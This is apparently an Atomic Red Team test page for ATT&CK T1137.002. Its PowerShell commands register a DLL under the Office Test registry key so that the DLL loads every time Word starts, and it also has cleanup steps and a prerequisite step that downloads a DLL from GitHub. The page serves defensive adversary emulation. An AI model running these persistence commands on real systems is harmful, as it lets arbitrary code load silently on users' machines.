# T1137.002 - Office Application Startup: Office Test
## [Description from ATT&CK](https://attack.mitre.org/techniques/T1137/002)
<blockquote>Adversaries may abuse the Microsoft Office "Office Test" Registry key to obtain persistence on a compromised system. An Office Test Registry location exists that allows a user to specify an arbitrary DLL that will be executed every time an Office application is started. This Registry key is thought to be used by Microsoft to load DLLs for testing and debugging purposes while developing Office applications. This Registry key is not created by default during an Office installation.(Citation: Hexacorn Office Test)(Citation: Palo Alto Office Test Sofacy)

There exist user and global Registry keys for the Office Test feature:

* <code>HKEY_CURRENT_USER\Software\Microsoft\Office test\Special\Perf</code>
* <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Office test\Special\Perf</code>

Adversaries may add this Registry key and specify a malicious DLL that will be executed whenever an Office application, such as Word or Excel, is started.</blockquote>

#### Attack Commands: Run with `powershell`! 


```powershell
$wdApp = New-Object -COMObject "Word.Application"
if(-not $wdApp.path.contains("Program Files (x86)"))  
{
  Write-Host "64-bit Office"
  reg add "HKEY_CURRENT_USER\Software\Microsoft\Office test\Special\Perf" /t REG_SZ /d "PathToAtomicsFolder\T1137.002\bin\officetest_x64.dll" /f       
}
else{
  Write-Host "32-bit Office"
  reg add "HKEY_CURRENT_USER\Software\Microsoft\Office test\Special\Perf" /t REG_SZ /d "PathToAtomicsFolder\T1137.002\bin\officetest_x86.dll" /f
}
Stop-Process -Name "WinWord" 
Start-Process "WinWord"
```

#### Cleanup Commands:
```powershell
Stop-Process -Name "notepad","WinWord" -ErrorAction Ignore
Remove-Item "HKCU:\Software\Microsoft\Office test\Special\Perf" -ErrorAction Ignore
```



#### Dependencies:  Run with `powershell`!
##### Description: Microsoft Word must be installed
##### Check Prereq Commands:
```powershell
try {
  New-Object -COMObject "Word.Application" | Out-Null
  Stop-Process -Name "winword"
  exit 0
} catch { exit 1 }
```
##### Get Prereq Commands:
```powershell
Write-Host "You will need to install Microsoft Word manually to meet this requirement"
```
##### Description: DLL files must exist on disk at specified location
##### Check Prereq Commands:
```powershell
if ((Test-Path "PathToAtomicsFolder\T1137.002\bin\officetest_x64.dll") -and (Test-Path "PathToAtomicsFolder\T1137.002\bin\officetest_x86.dll")) {exit 0} else {exit 1}
```
##### Get Prereq Commands:
```powershell
New-Item -Type Directory "PathToAtomicsFolder\T1137.002\bin\" -Force | Out-Null
Invoke-Webrequest -Uri "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1137.002/bin/officetest_x64.dll" -UseBasicParsing -OutFile "PathToAtomicsFolder\T1137.002\bin\officetest_x64.dll"
